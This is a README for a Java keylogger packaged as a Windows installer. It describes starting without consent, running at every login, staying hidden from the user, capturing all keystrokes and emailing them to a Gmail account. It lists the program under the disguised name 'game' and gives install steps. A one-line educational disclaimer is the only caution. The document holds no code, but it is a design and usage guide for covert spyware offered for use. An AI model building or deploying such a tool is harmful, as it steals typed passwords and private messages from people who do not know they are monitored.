# Keylogger Application

This is a keylogger application built using Java and bundled with JRE 1.8 (32-bit) to ensure compatibility across different versions of Windows (both 32-bit and 64-bit). The app was converted into an executable file using Launch4j and packaged with an installer using Inno Setup.

## Features

- **Cross-Compatibility**: The application works on both 32-bit and 64-bit Windows operating systems. It automatically installs in the appropriate folder (`Program Files` for 32-bit and `Program Files (x86)` for 64-bit).
- **Automatic Startup**: Once installed, the application immediately starts without asking the user. For remaining hidden and to constantly register everything typed on the keyboard the app starts even after every windows login.
- **Stealth Mode**: The application is hidden from the Start menu and runs in the background without being visible to the user.
- **Bundled JRE**: The installer includes a 32-bit version of JRE 1.8, so no separate Java installation is required for running the application.

## How It Works

- The application operates as a **background Java process**.
- It uses several additional libraries, including:
  - `JNativeHook` for capturing global key events.
  - `smtp`, `imap`, and `mailapi` for handling email communication.
- After recording the keystrokes, the data is automatically sent to your email for monitoring purposes.

## Installation

1. Double-click the setup file to start the installation process.
2. The installation is straightforward and fast. Simply click the `Install` button to proceed.
3. If the operating system is 32-bit, the application will be installed in `Program Files`. For 64-bit systems, it will be installed in `Program Files (x86)`.
4. After installation, the application will launch automatically.
5. Once the installation is complete, click `Finish` to close the setup window.

## Usage

- The application runs in the background after installation and records user keystrokes.
- It connects to your Gmail account using SMTP and sends the captured keystrokes via email.
- The application is automatically launched on every system startup and remains hidden from the user interface.

## Uninstallation

To uninstall the application:
1. Go to `Control Panel` > `Programs` > `Uninstall a program`.
2. Find the application (`game`) and click `Uninstall`.
3. Follow the uninstallation instructions to remove the application from your system.

## License

This project is for educational purposes only. Unauthorized use of keyloggers can violate privacy laws. Use responsibly and ensure compliance with local regulations.
